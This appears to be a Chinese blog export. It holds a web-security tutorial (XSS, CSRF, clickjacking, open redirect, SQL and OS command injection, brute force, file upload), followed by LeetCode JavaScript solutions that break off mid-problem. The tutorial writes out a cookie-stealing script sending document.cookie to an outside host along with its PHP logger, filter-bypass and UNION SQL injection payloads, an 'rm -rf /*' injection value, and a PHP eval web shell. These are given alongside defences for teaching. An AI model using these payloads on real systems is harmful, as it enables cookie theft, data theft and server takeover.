攻击成功需要同时满足以下几个条件： POST 请求提交表单后端没做转义直接入库。 后端从数据库中取出数据没做转义直接输出给前端。 前端拿到后端数据没做转义直接渲染成 DOM。 持久型 XSS 有以下几个特点： 持久性，植入在数据库中 盗取用户敏感私密信息 危害面广 3.如何防御对于 XSS 攻击来说，通常有两种方式可以用来防御。 1) CSP CSP 本质上就是建立白名单，开发者明确告诉浏览器哪些外部资源可以加载和执行。我们只需要配置规则，如何拦截是由浏览器自己实现的。我们可以通过这种方式来尽量减少 XSS 攻击。 通常可以通过两种方式来开启 CSP： 设置 HTTP Header 中的 Content-Security-Policy 设置 meta 标签的方式 这里以设置 HTTP Header 来举例： 只允许加载本站资源 1Content-Security-Policy: default-src &apos;self&apos; 只允许加载 HTTPS 协议图片 1Content-Security-Policy: img-src https://* 允许加载任何来源框架 1Content-Security-Policy: child-src &apos;none&apos; 如需了解更多属性，请查看Content-Security-Policy文档 对于这种方式来说，只要开发者配置了正确的规则，那么即使网站存在漏洞，攻击者也不能执行它的攻击代码，并且 CSP 的兼容性也不错。 2) 转义字符 用户的输入永远不可信任的，最普遍的做法就是转义输入输出的内容，对于引号、尖括号、斜杠进行转义 12345678910function escape(str) &#123; str = str.replace(/&amp;/g, '&amp;amp;') str = str.replace(/&lt;/g, '&amp;lt;') str = str.replace(/&gt;/g, '&amp;gt;') str = str.replace(/"/g, '&amp;quto;') str = str.replace(/'/g, '&amp;#39;') str = str.replace(/`/g, '&amp;#96;') str = str.replace(/\//g, '&amp;#x2F;') return str&#125; 但是对于显示富文本来说，显然不能通过上面的办法来转义所有字符，因为这样会把需要的格式也过滤掉。对于这种情况，通常采用白名单过滤的办法，当然也可以通过黑名单过滤，但是考虑到需要过滤的标签和标签属性实在太多，更加推荐使用白名单的方式。 1234const xss = require('xss')let html = xss('&lt;h1 id="title"&gt;XSS Demo&lt;/h1&gt;&lt;script&gt;alert("xss");&lt;/script&gt;')// -&gt; &lt;h1&gt;XSS Demo&lt;/h1&gt;&amp;lt;script&amp;gt;alert("xss");&amp;lt;/script&amp;gt;console.log(html) 以上示例使用了 js-xss 来实现，可以看到在输出中保留了 h1 标签且过滤了 script 标签。 3) HttpOnly Cookie。 这是预防XSS攻击窃取用户cookie最有效的防御手段。Web应用程序在设置cookie时，将其属性设为HttpOnly，就可以避免该网页的cookie被客户端恶意JavaScript窃取，保护用户cookie信息。 富文本编辑器中XSS攻击的防范1.建立白名单就好，保留要用的标签，其他全部过滤 2.入数据库的时候 转义为实体字符，出库的时候还原，并过滤掉以下 12&lt;script&gt;&lt;/script&gt;javascript:xxx; XSS 跨站脚本攻击Chrome浏览器默认开启xss监听，测试前须命令行启动浏览器，关闭监听。 12cd /Applications/Google Chrome.app/Contents/MacOS./Google Chrome --disable-xss-auditor 反射型：非持久化，用户主动点击带有恶意URL，发送请求到后端，后端返回带有恶意脚本的页面。假设某网站 http://A.com 的某个输入框存在XSS漏洞，能通过输入框或者URL传入脚本执行。比如它的后端php代码是这样的 1echo 'Hello ' . $_GET[ 'name' ]; 那么，就可以在 url中传入参数name。生成 恶意url： 1A.com/?name=&lt;script&gt;window.open('B.com/ck.php?c='+document.cookie)&lt;/script&gt; ck.php文件代码如下，将获得的cookie存入cookie.txt。 1234567$cookie = $_GET[&apos;c&apos;]; $ip = getenv (&apos;REMOTE_ADDR&apos;); $time=date(&quot;j F, Y, g:i a&quot;); $referer=getenv (&apos;HTTP_REFERER&apos;); $fp = fopen(&apos;cookie.txt&apos;, &apos;a&apos;); fwrite($fp, &apos;Cookie: &apos;.$cookie.&quot;\n&quot;.&apos;IP: &apos;.$ip.&quot;\n&quot;.&apos;Date and Time: &apos;.$time.&quot;\n&quot;.&apos;Referer: &apos;.$referer.&quot;\n\n&quot;); fclose($fp); 通过短域名生成网站,将上诉 恶意 url 映射成类似http://dwz.cn/B4l3Ydke的网址欺骗用户，发送给已经在[http://A.com](http://a.com/)登录的用户，用户点击之后，cookie信息就会自动保存到 http://B.com下的cookie.txt中。 通常，后端不会这么如此信任用户输入，会对各种输入进行正则过滤限制。针对各种过滤出现了对应的恶意 payload, 通过事件、通过协议、通过请求。 12345&lt;Script&gt; 恶意代码 &lt;/script&gt;&lt;sc&lt;script&gt;ript&gt; 恶意代码 &lt;/script&gt;&lt;img onerror=" 恶意代码 " &gt;&lt;div style="position:fixed;top:0;left:0;bottom:0;right:0;" onclick=" 恶意代码 "&gt;&lt;/div&gt;... 以下代码通过base64编码，依旧能实现恶意攻击。 1&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgiMSIpOzwvc2NyaXB0Pg==&quot;&gt;&lt;/object&gt; 有效的解决方法是通过转义，通过 htmlspecialchars，将具有特殊意义的字符进行转义。 12345&amp; 变为 &amp;amp;" 变为 &amp;quot;' 变为 &amp;#039;&lt; 变为 &amp;lt;&gt; 变为 &amp;gt; 存储型：持久型，攻击者提交恶意脚本最终进入到数据库，用户访问加载页面时，恶意脚本执行。 区别于存储型XSS 攻击，脚本因为存入数据库导致危害更大，所有访问该页面的用户都将被攻击。但因为业务需要比如富文本框功能，就不能一味的使用 htmlspecialchars 转义，而应该自定义过滤规则，将内容限制在安全范围内。 12放行常见标签及img标签以实现富文本功能。对script,iframe,form标签,on开头的属性,href属性等进行过滤。 DOM型:客户端脚本通过DOM动态输出数据到页面，而不经过服务器。 当前端出现以下代码时，就要小心了，确保等号右边的内容可控。 123456789101112document.write = innerHTML = eval()// 不好的例子if (document.location.href.indexOf("default=") &gt;= 0) &#123;var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);document.write("&lt;option value='" + lang + "'&gt;&lt;/option&gt;");&#125;// 此时可以通过以下payload注入A.com?default=German#&lt;script&gt; 恶意代码 &lt;/script&gt; 大部分xss都是为了获得cookie，进行下一步的破坏，因此系统层面也应考虑cookie有效期，HttpOnly等方式。 二、CSRFCSRF(Cross Site Request Forgery)，即跨站请求伪造，是一种常见的Web攻击，它利用用户已登录的身份，在用户毫不知情的情况下，以用户的名义完成非法操作。 1. CSRF攻击的原理下面先介绍一下CSRF攻击的原理： 完成 CSRF 攻击必须要有三个条件： 用户已经登录了站点 A，并在本地记录了 cookie 在用户没有登出站点 A 的情况下（也就是 cookie 生效的情况下），访问了恶意攻击者提供的引诱危险站点 B (B 站点要求访问站点A)。 站点 A 没有做任何 CSRF 防御 我们来看一个例子： 当我们登入转账页面后，突然眼前一亮惊现”XXX隐私照片，不看后悔一辈子”的链接，耐不住内心躁动，立马点击了该危险的网站（页面代码如下图所示），但当这页面一加载，便会执行submitForm这个方法来提交转账请求，从而将10块转给黑客。 2.如何防御防范 CSRF 攻击可以遵循以下几种规则： Get 请求不对数据进行修改 不让第三方网站访问到用户 Cookie 阻止第三方网站请求接口 请求时附带验证信息，比如验证码或者 Token 1) SameSite 可以对 Cookie 设置 SameSite 属性。该属性表示 Cookie 不随着跨域请求发送，可以很大程度减少 CSRF 的攻击，但是该属性目前并不是所有浏览器都兼容。 2) Referer Check HTTP Referer是header的一部分，当浏览器向web服务器发送请求时，一般会带上Referer信息告诉服务器是从哪个页面链接过来的，服务器籍此可以获得一些信息用于处理。可以通过检查请求的来源来防御CSRF攻击。正常请求的referer具有一定规律，如在提交表单的referer必定是在该页面发起的请求。所以通过检查http包头referer的值是不是这个页面，来判断是不是CSRF攻击。 但在某些情况下如从https跳转到http，浏览器处于安全考虑，不会发送referer，服务器就无法进行check了。若与该网站同域的其他网站有XSS漏洞，那么攻击者可以在其他网站注入恶意脚本，受害者进入了此类同域的网址，也会遭受攻击。出于以上原因，无法完全依赖Referer Check作为防御CSRF的主要手段。但是可以通过Referer Check来监控CSRF攻击的发生。 3) Anti CSRF Token 目前比较完善的解决方案是加入Anti-CSRF-Token。即发送请求时在HTTP 请求中以参数的形式加入一个随机产生的token，并在服务器建立一个拦截器来验证这个token。服务器读取浏览器当前域cookie中这个token值，会进行校验该请求当中的token和cookie当中的token值是否都存在且相等，才认为这是合法的请求。否则认为这次请求是违法的，拒绝该次服务。 这种方法相比Referer检查要安全很多，token可以在用户登陆后产生并放于session或cookie中，然后在每次请求时服务器把token从session或cookie中拿出，与本次请求中的token 进行比对。由于token的存在，攻击者无法再构造出一个完整的URL实施CSRF攻击。但在处理多个页面共存问题时，当某个页面消耗掉token后，其他页面的表单保存的还是被消耗掉的那个token，其他页面的表单提交时会出现token错误。 防范 token：服务端预先生成一个随机数，在渲染具有表单的页面时将随机数以不可见的形式( visible:hidden )插入到表单域，客户端请求时带上这个随机数，服务端进行校验，确定请求确实来自该页面。 对于B网站，即使请求会带上cookie，也由于获取不到该随机数（该随机数每次刷新页面都不一致），导致后端校验失败。 4) 验证码 应用程序和用户进行交互过程中，特别是账户交易这种核心步骤，强制用户输入验证码，才能完成最终请求。在通常情况下，验证码够很好地遏制CSRF攻击。但增加验证码降低了用户的体验，网站不能给所有的操作都加上验证码。所以只能将验证码作为一种辅助手段，在关键业务点设置验证码。 三、点击劫持点击劫持是一种视觉欺骗的攻击手段。攻击者将需要攻击的网站通过 iframe 嵌套的方式嵌入自己的网页中，并将 iframe 设置为透明，在页面中透出一个按钮诱导用户点击。 1. 特点 隐蔽性较高，骗取用户操作 “UI-覆盖攻击” 利用iframe或者其它标签的属性 2. 点击劫持的原理用户在登陆 A 网站的系统后，被攻击者诱惑打开第三方网站，而第三方网站通过 iframe 引入了 A 网站的页面内容，用户在第三方网站中点击某个按钮（被装饰的按钮），实际上是点击了 A 网站的按钮。接下来我们举个例子：我在优酷发布了很多视频，想让更多的人关注它，就可以通过点击劫持来实现 123456789101112131415161718192021222324iframe &#123;width: 1440px;height: 900px;position: absolute;top: -0px;left: -0px;z-index: 2;-moz-opacity: 0;opacity: 0;filter: alpha(opacity=0);&#125;button &#123;position: absolute;top: 270px;left: 1150px;z-index: 1;width: 90px;height:40px;&#125;&lt;/style&gt;......&lt;button&gt;点击脱衣&lt;/button&gt;&lt;img src="http://pic1.win4000.com/wallpaper/2018-03-19/5aaf2bf0122d2.jpg"&gt;&lt;iframe src="http://i.youku.com/u/UMjA0NTg4Njcy" scrolling="no"&gt;&lt;/iframe&gt; 从上图可知，攻击者通过图片作为页面背景，隐藏了用户操作的真实界面，当你按耐不住好奇点击按钮以后，真正的点击的其实是隐藏的那个页面的订阅按钮，然后就会在你不知情的情况下订阅了。 3. 如何防御1）X-FRAME-OPTIONS X-FRAME-OPTIONS是一个 HTTP 响应头，在现代浏览器有一个很好的支持。这个 HTTP 响应头 就是为了防御用 iframe 嵌套的点击劫持攻击。 该响应头有三个值可选，分别是 DENY，表示页面不允许通过 iframe 的方式展示 SAMEORIGIN，表示页面可以在相同域名下通过 iframe 的方式展示 ALLOW-FROM，表示页面可以在指定来源的 iframe 中展示 2）JavaScript 防御 对于某些远古浏览器来说，并不能支持上面的这种方式，那我们只有通过 JS 的方式来防御点击劫持了。 1234567891011121314151617&lt;head&gt; &lt;style id="click-jack"&gt; html &#123; display: none !important; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;script&gt; if (self == top) &#123; var style = document.getElementById('click-jack') document.body.removeChild(style) &#125; else &#123; top.location = self.location &#125; &lt;/script&gt;&lt;/body&gt; 以上代码的作用就是当通过 iframe 的方式加载页面时，攻击者的网页直接不显示所有内容了。 给大家推荐一个好用的BUG监控工具Fundebug，欢迎免费试用！ 四、URL跳转漏洞定义：借助未验证的URL跳转，将应用程序引导到不安全的第三方区域，从而导致的安全问题。 1.URL跳转漏洞原理黑客利用URL跳转漏洞来诱导安全意识低的用户点击，导致用户信息泄露或者资金的流失。其原理是黑客构建恶意链接(链接需要进行伪装,尽可能迷惑),发在QQ群或者是浏览量多的贴吧/论坛中。安全意识低的用户点击后,经过服务器或者浏览器解析后，跳到恶意的网站中。 恶意链接需要进行伪装,经常的做法是熟悉的链接后面加上一个恶意的网址，这样才迷惑用户。 诸如伪装成像如下的网址，你是否能够识别出来是恶意网址呢？ 123http://gate.baidu.com/index?act=go&amp;url=http://t.cn/RVTatrdhttp://qt.qq.com/safecheck.html?flag=1&amp;url=http://t.cn/RVTatrdhttp://tieba.baidu.com/f/user/passport?jumpUrl=http://t.cn/RVTatrd 2.实现方式： Header头跳转 Javascript跳转 META标签跳转 这里我们举个Header头跳转实现方式： 12345&lt;?php$url=$_GET['jumpto'];header("Location: $url");?&gt;http://www.wooyun.org/login.php?jumpto=http://www.evil.com 这里用户会认为www.wooyun.org都是可信的，但是点击上述链接将导致用户最终访问www.evil.com这个恶意网址。 3.如何防御1)referer的限制 如果确定传递URL参数进入的来源，我们可以通过该方式实现安全限制，保证该URL的有效性，避免恶意用户自己生成跳转链接 2)加入有效性验证Token 我们保证所有生成的链接都是来自于我们可信域的，通过在生成的链接里加入用户不可控的Token对生成的链接进行校验，可以避免用户生成自己的恶意链接从而被利用，但是如果功能本身要求比较开放，可能导致有一定的限制。 五、SQL注入SQL注入是一种常见的Web安全漏洞，攻击者利用这个漏洞，可以访问或修改数据，或者利用潜在的数据库漏洞进行攻击。 1.SQL注入的原理我们先举一个万能钥匙的例子来说明其原理： 12345&lt;form action="/login" method="POST"&gt; &lt;p&gt;Username: &lt;input type="text" name="username" /&gt;&lt;/p&gt; &lt;p&gt;Password: &lt;input type="password" name="password" /&gt;&lt;/p&gt; &lt;p&gt;&lt;input type="submit" value="登陆" /&gt;&lt;/p&gt;&lt;/form&gt; 后端的 SQL 语句可能是如下这样的： 1234567let querySQL = ` SELECT * FROM user WHERE username='$&#123;username&#125;' AND psw='$&#123;password&#125;'`;// 接下来就是执行 sql 语句... 这是我们经常见到的登录页面，但如果有一个恶意攻击者输入的用户名是 admin&#39; --，密码随意输入，就可以直接登入系统了。why! —-这就是SQL注入 我们之前预想的SQL 语句是: 1SELECT * FROM user WHERE username='admin' AND psw='password' 但是恶意攻击者用奇怪用户名将你的 SQL 语句变成了如下形式： 1SELECT * FROM user WHERE username='admin' --' AND psw='xxxx' 在 SQL 中,&#39; --是闭合和注释的意思，– 是注释后面的内容的意思，所以查询语句就变成了： 1SELECT * FROM user WHERE username='admin' 所谓的万能密码,本质上就是SQL注入的一种利用方式。 一次SQL注入的过程包括以下几个过程： 获取用户请求参数 拼接到代码当中 SQL语句按照我们构造参数的语义执行成功 SQL注入的必备条件：1.可以控制输入的数据2.服务器要执行的代码拼接了控制的数据。 我们会发现SQL注入流程中与正常请求服务器类似，只是黑客控制了数据，构造了SQL查询，而正常的请求不会SQL查询这一步，SQL注入的本质:数据和代码未分离，即数据当做了代码来执行。 假如网站后端代码如下： 12$id = $_REQUEST[ &apos;id&apos; ];&quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;;&quot;; 即 将获得id参数值，组合成SQL语句进行查询，那么就存在SQL注入的风险。 攻击者通过将 id 参数设置为 1’or’1’=’1 。’或’ 语法使得 WHERE 条件一直成立，结果能查询出users表的所有数据。 id 设置为 1’ order by n # ，要求结果以表的第n个字段排序，则当n = 1,2,3…依次执行，出现报错时假设n=5，即说明该表只有4个字段。 通过以下 sql 能挖掘出更多的数据库信息。 1234567891011121314查询数据库用户，版本信息:1&apos; union select 1,concat(database(),version(),user()) #查询所有数据库名字:1&apos; union select 1,schema_name from information_schema.schemata #查询数据库的表名，0x64767761十六进制转字符为 dvwa:&apos; union select 1,table_name from information_schema.tables where table_schema=0x64767761 #查询表的字段，0x7573657273十六进制转字符为 users:&apos; union select 1,column_name from information_schema.columns where table_name=0x7573657273 #查看表的内容:&apos; union select user,password from users # 2.危害 获取数据库信息 管理员后台用户名和密码 获取其他数据库敏感信息：用户名、密码、手机号码、身份证、银行卡信息…… 整个数据库：脱裤 获取服务器权限 植入Webshell，获取服务器后门 读取服务器敏感文件 3.如何防御 严格限制Web应用的数据库的操作权限，给此用户提供仅仅能够满足其工作的最低权限，从而最大限度的减少注入攻击对数据库的危害 后端代码检查输入的数据是否符合预期，严格限制变量的类型，例如使用正则表达式进行一些匹配处理。 对进入数据库的特殊字符（’，”，，&lt;，&gt;，&amp;，*，; 等）进行转义处理，或编码转换。基本上所有的后端语言都有对字符串进行转义处理的方法，比如 lodash 的 lodash._escapehtmlchar 库。 所有的查询语句建议使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到 SQL 语句中，即不要直接拼接 SQL 语句。例如 Node.js 中的 mysqljs 库的 query 方法中的 ? 占位参数。 六、OS命令注入攻击OS命令注入和SQL注入差不多，只不过SQL注入是针对数据库的，而OS命令注入是针对操作系统的。OS命令注入攻击指通过Web应用，执行非法的操作系统命令达到攻击的目的。只要在能调用Shell函数的地方就有存在被攻击的风险。倘若调用Shell时存在疏漏，就可以执行插入的非法命令。 命令注入攻击可以向Shell发送命令，让Windows或Linux操作系统的命令行启动程序。也就是说，通过命令注入攻击可执行操作系统上安装着的各种程序。 1.原理 黑客构造命令提交给web应用程序，web应用程序提取黑客构造的命令，拼接到被执行的命令中，因黑客注入的命令打破了原有命令结构，导致web应用执行了额外的命令，最后web应用程序将执行的结果输出到响应页面中。 我们通过一个例子来说明其原理，假如需要实现一个需求：用户提交一些内容到服务器，然后在服务器执行一些系统命令去返回一个结果给用户 1234// 以 Node.js 为例，假如在接口中需要从 github 下载用户指定的 repoconst exec = require('mz/child_process').exec;let params = &#123;/* 用户输入的参数 */&#125;;exec(`git clone $&#123;params.repo&#125; /some/path`); 如果 params.repo 传入的是 https://github.com/admin/admin.github.io.git 确实能从指定的 git repo 上下载到想要的代码。但是如果 params.repo 传入的是 https://github.com/xx/xx.git &amp;&amp; rm -rf /* &amp;&amp; 恰好你的服务是用 root 权限起的就糟糕了。 2.如何防御 后端对前端提交内容进行规则限制（比如正则表达式）。 在调用系统命令前对所有传入参数进行命令行参数转义过滤。 不要直接拼接命令语句，借助一些工具做拼接、转义预处理，例如 Node.js 的 shell-escape npm包 暴力破解本质上就是将密码字典的每一种情况，通过自动化工具进行组合尝试，进而得到密码字典中正确的一项。 演示登录破解 - 安装Burp Suite（以下简称BS）,设置代理，使得 BS 能够拦截浏览器请求，捕获登录的数据包。 - 进入待破解网站A，BS开启拦截，输入账号密码点击登陆，此时请求会由BS控制，如下图所示: - 复制Raw数据包到 Intruder 页面，设置数据包中的账号和密码的占位（Add $），在 Payloads 中加载本地字典，Attack type选择Cluster bomb，这样每次请求就会从字典中依次加载字符串作为账号和密码去请求。如下图: - 开始攻击之前设置 Option ，便于我们快速找出登录成功的账号密码。经过分析，A网站登录无论正确错误都会返回302状态码，区别在于正确时返回头Location字段为 index.php，错误时为 login.php。 - 设置Grep Match，新增”index.php”，即响应中包含字符串的账号密码组合将被打勾标记。设置Grep Extract，将响应中Location之后的内容都打印出来。如下图: - 可见 admin 和 password 的组合即为正确账号密码。 为了快速出结果，演示中账号密码字典仅五种情况，5*5 = 25次即可确定是否能破解，实际应用中字典量远大于此。 防范 1231.复杂密码与密码加密2.人机识别验证3.接口请求次数限制 命令执行应用有时需要调用一些执行系统命令的函数。如PHP中的 system,exec,shell_exec 等。 如下后台代码，将前端输入框的值作为参数传入，执行 ping 命令，并将执行结果打印。 12$cmd = shell_exec( &apos;ping -c 4 &apos; . $target );$html .= &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;; 此时可构造恶意输入值如下： 123baidu.com &amp;&amp; whoamibaidu.com &amp;&amp; cd ../ &amp;&amp; pwdbaidu.com &amp;&amp; cd ../ &amp;&amp; ls 实际破坏中原不仅仅是 ‘ls’ 这种无害的命令。 防范 1231.对Shell命令中的特殊符号进行替换，如&apos;&amp;&apos;，&apos;|&apos;，&apos;;&apos;,&apos;||&apos;等。2.对于确定的输入，比如IP，明确限制输入值格式。3.服务器权限设置。 文件上传漏洞利用的三个重要条件： 1231.可以上传木马文件。2.文件能被执行。3.上传文件的路径可知。 利用步骤 A网站允许上传任意文件，则构建如下一句话脚本，保存为 hack.php 上传到A网站。注意 apple 字符串，该字符串可任意设置。 123&lt;?php eval($_POST['apple']);?&gt; 假设已知A网站上传的文件都在/uploads/目录下，可通过http://A.com/uploads/hack.php访问该文件。 打开 中国菜刀 软件，该软件被安全软件报病毒，谨慎使用。 右键添加SHELL，填写 http://A.com/uploads/hack.php 及 apple 字符串(与hack.php保持一致)，点击添加。如下图： 如果请求成功，则可以读取服务器任意文件,以及运行虚拟终端。如下图： 参考资料 常见Web 安全攻防总结 前端面试之道 图解Http Web安全知多少 web安全之点击劫持(clickjacking) URL重定向/跳转漏洞 网易web白帽子 https://zhuanlan.zhihu.com/p/56122850 https://zhuanlan.zhihu.com/p/43292233]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2017%2F12%2F16%2FLeetCode%2F</url>
    <content type="text"><![CDATA[前言 1. 两数之和给定一个整数数组 nums 和一个目标值 target，请你在该数组中找出和为目标值的那 两个 整数，并返回他们的数组下标。 你可以假设每种输入只会对应一个答案。但是，你不能重复利用这个数组中同样的元素。 示例: 给定 nums = [2, 7, 11, 15], target = 9 因为 nums[0] + nums[1] = 2 + 7 = 9 所以返回 [0, 1] 1234567891011var twoSum = function(nums, target) &#123; let arr = [],length = nums.length; for(let i = 0;i&lt;length;++i)&#123; let temp = target - nums[i]; if(arr[temp]!=undefined)&#123; return [nums.indexOf(temp),i] &#125;else&#123; arr[nums[i]]=nums[i] &#125; &#125;&#125;; 哈希表的方法，用空间换时间，用数组的结构，要用indexOf查询下标，耗时 执行用时 :104 ms, 在所有 JavaScript 提交中击败了72.39%的用户 内存消耗 :34.5 MB, 在所有 JavaScript 提交中击败了72.79%的用户 1234567891011121314151617var twoSum = function(nums, target) &#123; let length = nums.length; let arr = new Object() for(let i = 0;i&lt;length;++i)&#123; let temp = target - nums[i]; if(arr.hasOwnProperty(temp))&#123; return [arr[temp],i] &#125;else&#123; Object.defineProperty(arr,nums[i],&#123; value : i, writable : true, enumerable : true, configurable : true &#125;) &#125; &#125;&#125;; 哈希表的方法，用空间换时间，用对象的方法，空间稍大但时间优化近20% 执行用时 :84 ms, 在所有 JavaScript 提交中击败了84.29%的用户 内存消耗 :36.3 MB, 在所有 JavaScript 提交中击败了7.49%的用户 2. 两数相加给出两个 非空 的链表用来表示两个非负的整数。其中，它们各自的位数是按照 逆序 的方式存储的，并且它们的每个节点只能存储 一位 数字。 如果，我们将这两个数相加起来，则会返回一个新的链表来表示它们的和。 您可以假设除了数字 0 之外，这两个数都不会以 0 开头。 示例： 输入：(2 -&gt; 4 -&gt; 3) + (5 -&gt; 6 -&gt; 4)输出：7 -&gt; 0 -&gt; 8原因：342 + 465 = 807 1234567891011121314151617181920var addTwoNumbers = function(l1, l2) &#123; let temp = 0;let p=l1,q=l2; while(q!=null)&#123; if(p.next==null&amp;&amp;q.next!=null)&#123; p.next = new ListNode(0); &#125; if(q.next==null&amp;&amp;p.next!=null)&#123; q.next = new ListNode(0); &#125; let sumAll = temp + p.val + q.val; p.val = sumAll % 10; temp = Math.floor(sumAll / 10); if(p.next == null &amp;&amp; q.next == null &amp;&amp; temp!=0)&#123; p.next = new ListNode(temp); &#125; p=p.next q=q.next &#125; return l1&#125;; 浅拷贝保存引用，操作p和q 执行用时 :172 ms, 在所有 JavaScript 提交中击败了78.18%的用户 内存消耗 :38.3 MB, 在所有 JavaScript 提交中击败了68.50%的用户 3. 无重复字符的最长子串给定一个字符串，请你找出其中不含有重复字符的 最长子串 的长度。 示例 1: 输入: “abcabcbb”输出: 3解释: 因为无重复字符的最长子串是 “abc”，所以其长度为 3。示例 2: 输入: “bbbbb”输出: 1解释: 因为无重复字符的最长子串是 “b”，所以其长度为 1。示例 3: 输入: “pwwkew”输出: 3解释: 因为无重复字符的最长子串是 “wke”，所以其长度为 3。请注意，你的答案必须是 子串 的长度，”pwke” 是一个子序列，不是子串。 12345678910111213141516171819202122var lengthOfLongestSubstring = function(s) &#123; let arr =new Array(); let j=0; arr[j]=new Array(); for(let i = 0;i&lt;s.length;++i)&#123; let k = arr[j].indexOf(s.charAt(i)) if(k==-1)&#123; arr[j].push(s.charAt(i)) &#125;else&#123; j++ arr[j]=new Array() arr[j]=arr[j-1].slice(k+1) arr[j-1]=arr[j-1].length arr[j].push(s.charAt(i)) &#125; &#125; arr[j]=arr[j].length arr.sort((a,b)=&gt;&#123; return b-a &#125;) return arr[0]&#125;; 开一个二维数组储存每段不重复子串，新开一个元素就把上一个元素转换成具体长度，排序求解 执行用时 :140 ms, 在所有 JavaScript 提交中击败了56.06%的用户 内存消耗 :43 MB, 在所有 JavaScript 提交中击败了13.45%的用户 12345678910111213141516var lengthOfLongestSubstring = function(s) &#123; if(s.length==0)&#123; return 0 &#125; let obj = &#123;&#125;,ans = 0,start=0; for(let i =0;i&lt;s.length;i++)&#123; if(obj.hasOwnProperty(s.charAt(i)))&#123; start = Math.max(start,obj[s.charAt(i)]+1) obj[s.charAt(i)]=i &#125;else&#123; obj[s.charAt(i)]=i &#125; ans = Math.max(i-start,ans) &#125; return ans+1&#125;; 滑动窗口https://leetcode-cn.com/problems/longest-substring-without-repeating-characters/solution/hua-jie-suan-fa-3-wu-zhong-fu-zi-fu-de-zui-chang-z/ 执行用时 :136 ms, 在所有 JavaScript 提交中击败了59.07%的用户 内存消耗 :40 MB, 在所有 JavaScript 提交中击败了55.58%的用户 4. 寻找两个有序数组的中位数给定两个大小为 m 和 n 的有序数组 nums1 和 nums2。 请你找出这两个有序数组的中位数，并且要求算法的时间复杂度为 O(log(m + n))。 你可以假设 nums1 和 nums2 不会同时为空。 示例 1: nums1 = [1, 3]nums2 = [2] 则中位数是 2.0示例 2: nums1 = [1, 2]nums2 = [3, 4] 则中位数是 (2 + 3)/2 = 2.5 12345678910111213var findMedianSortedArrays = function(nums1, nums2) &#123; nums1 = nums1.concat(nums2) nums1 = nums1.sort((a,b)=&gt;&#123; return a-b &#125;) let m = nums1.length; if(m%2==0)&#123; return (nums1[m/2]+nums1[m/2-1])/2 &#125;else&#123; return nums1[Math.floor(m/2)] &#125;&#125;; 暴力法，合并数组后排序取值 执行用时 :204 ms, 在所有 JavaScript 提交中击败了54.66%的用户 内存消耗 :39.3 MB, 在所有 JavaScript 提交中击败了61.53%的用户 5. 最长回文子串给定一个字符串 s，找到 s 中最长的回文子串。你可以假设 s 的最大长度为 1000。 示例 1： 输入: “babad”输出: “bab”注意: “aba” 也是一个有效答案。示例 2： 输入: “cbbd”输出: “bb” 1234567891011121314151617181920var longestPalindrome = function(s) &#123; let len = s.length,start = 0,end = 0; for(let i = 0;i&lt;len;++i)&#123; let l1 = centralExpand(s,i,i,len), l2 = centralExpand(s,i,i+1,len); let l3 = Math.max(l1,l2); if (l3 &gt; end - start) &#123; start = i - l3/2+1 end = i + l3/2+1 &#125; &#125; return s.substring(start, end);&#125;;function centralExpand(s,l,r,len)&#123; while(l&gt;=0 &amp;&amp; r&lt;=len &amp;&amp; s.charAt(l)==s.charAt(r))&#123; l--; r++; &#125; return r-l-1;&#125; 中心扩展算法事实上，只需使用恒定的空间，我们就可以在 O(n^2) 的时间内解决这个问题。 我们观察到回文中心的两侧互为镜像。因此，回文可以从它的中心展开，并且只有 2n - 1 个中心。对比扩展中心的两侧 时间复杂度：O(n^2)，由于围绕中心来扩展回文会耗去 O(n) 的时间，所以总的复杂度为 O(n^2)。 空间复杂度：O(1)。 执行用时 :180 ms, 在所有 JavaScript 提交中击败了62.54%的用户 内存消耗 :37.1 MB, 在所有 JavaScript 提交中击败了57.35%的用户 6. Z 字形变换将一个给定字符串根据给定的行数，以从上往下、从左到右进行 Z 字形排列。 比如输入字符串为 “LEETCODEISHIRING” 行数为 3 时，排列如下： L C I RE T O E S I I GE D H N之后，你的输出需要从左往右逐行读取，产生出一个新的字符串，比如：”LCIRETOESIIGEDHN”。 请你实现这个将字符串进行指定行数变换的函数： string convert(string s, int numRows); 123456789101112131415161718192021222324252627282930313233343536var convert = function(s, numRows) &#123; let str = []; if(numRows==1|s.length==1|s.length&lt;=numRows)&#123; return s &#125; for(let i=0;i&lt;s.length/(numRows*2-2);++i)&#123; str[i]= s.substring(i*(numRows*2-2),(i+1)*(numRows*2-2)); str[i]=str[i].split(&quot;&quot;); &#125; let strs = []; for(let j=0;j&lt;numRows;++j)&#123; strs[j]=&apos;&apos;; if(j==0)&#123; for(let i=0;i&lt;str.length;++i)&#123; strs[j]+=str[i][0]; &#125; &#125;else if(j==numRows-1)&#123; for(let i=0;i&lt;str.length;++i)&#123; if(str[i][numRows-1])&#123; strs[j]+=str[i][numRows-1]; &#125; &#125; &#125;else&#123; for(let i=0;i&lt;str.length;++i)&#123; if(str[i][numRows*2-2-j])&#123; strs[j]+=str[i][j]+str[i][numRows*2-2-j]; &#125;else if(str[i][j])&#123; strs[j]+=str[i][j] &#125; &#125; &#125; &#125; strs=strs.join(&quot;&quot;) return strs;&#125;; 执行用时 :152 ms, 在所有 JavaScript 提交中击败了47.37%的用户 内存消耗 :39.1 MB, 在所有 JavaScript 提交中击败了46.97%的用户 7. 整数反转给出一个 32 位的有符号整数，你需要将这个整数中每位上的数字进行反转。 示例 1: 输入: 123输出: 321 示例 2: 输入: -123输出: -321示例 3: 输入: 120输出: 21注意: 假设我们的环境只能存储得下 32 位的有符号整数，则其数值范围为 [−2^31, 2^31 − 1]。请根据这个假设，如果反转后整数溢出那么就返回 0。 1234567var reverse = function(x) &#123; var x1 = x &lt; 0 ? -1 : 1; let y = Math.abs(x); y = y.toString().split(&apos;&apos;).reverse().join(&apos;&apos;); let s = +y*x1 return s&gt;Math.pow(2, 31) - 1||s&lt;-Math.pow(2, 31)?0:s&#125;; 执行用时 :112 ms, 在所有 JavaScript 提交中击败了51.81%的用户 内存消耗 :35.8 MB, 在所有 JavaScript 提交中击败了40.11%的用户 8. 字符串转换整数 (atoi)123456789101112131415161718192021222324252627/** * @param 